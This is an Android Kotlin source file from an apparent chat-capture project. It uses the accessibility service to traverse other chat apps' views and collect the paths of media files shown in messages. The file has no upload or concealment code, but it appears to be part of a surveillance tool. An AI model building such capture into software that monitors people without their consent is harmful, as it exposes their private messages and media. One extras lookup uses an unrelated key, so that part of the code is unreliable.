package com.chats.capture.utils

import android.content.Context
import android.view.accessibility.AccessibilityNodeInfo
import timber.log.Timber
import java.io.File

/**
 * Extracts media files from chat apps via accessibility service
 */
class ChatMediaExtractor(private val context: Context) {
    
    /**
     * Extract media files from accessibility node (chat message view)
     */
    fun extractMediaFromNode(rootNode: AccessibilityNodeInfo?): List<String>? {
        if (rootNode == null) return null
        
        val mediaFiles = mutableListOf<String>()
        
        try {
            // Traverse the node tree to find image/video views
            traverseNode(rootNode) { node ->
                val className = node.className?.toString() ?: ""
                
                // Check for ImageView, VideoView, or custom media views
                if (className.contains("Image", ignoreCase = true) ||
                    className.contains("Video", ignoreCase = true) ||
                    className.contains("Media", ignoreCase = true)) {
                    
                    // Try to extract URI or file path
                    val contentDescription = node.contentDescription?.toString() ?: ""
                    val text = node.text?.toString() ?: ""
                    
                    // Check for file paths
                    if (text.contains("/") && (text.contains(".jpg") || text.contains(".png") || 
                        text.contains(".mp4") || text.contains(".gif"))) {
                        val file = File(text)
                        if (file.exists()) {
                            mediaFiles.add(file.absolutePath)
                        }
                    }
                    
                    // Check content description for paths
                    if (contentDescription.contains("/") && (contentDescription.contains(".jpg") || 
                        contentDescription.contains(".png") || contentDescription.contains(".mp4"))) {
                        val file = File(contentDescription)
                        if (file.exists()) {
                            mediaFiles.add(file.absolutePath)
                        }
                    }
                    
                    // Check for URI in node extras (if available)
                    try {
                        val bundle = node.extras
                        bundle?.let {
                            val uriString = it.getCharSequence("android.view.accessibility.extra.LEGACY_SCROLLABLE")?.toString()
                            uriString?.let { uri ->
                                if (isMediaPath(uri)) {
                                    mediaFiles.add(uri)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        // Extras may not be available on all Android versions
                    }
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting media from accessibility node")
        }
        
        return if (mediaFiles.isNotEmpty()) mediaFiles.distinct() else null
    }
    
    /**
     * Traverse accessibility node tree recursively
     */
    private fun traverseNode(node: AccessibilityNodeInfo, action: (AccessibilityNodeInfo) -> Unit) {
        try {
            action(node)
            
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                child?.let {
                    traverseNode(it, action)
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error traversing node")
        }
    }
    
    /**
     * Check if a string is a media file path
     */
    private fun isMediaPath(path: String): Boolean {
        val mediaExtensions = listOf(".jpg", ".jpeg", ".png", ".gif", ".webp", 
            ".mp4", ".avi", ".mov", ".mkv", ".3gp", ".mp3", ".wav", ".ogg")
        return mediaExtensions.any { path.lowercase().endsWith(it) }
    }
}
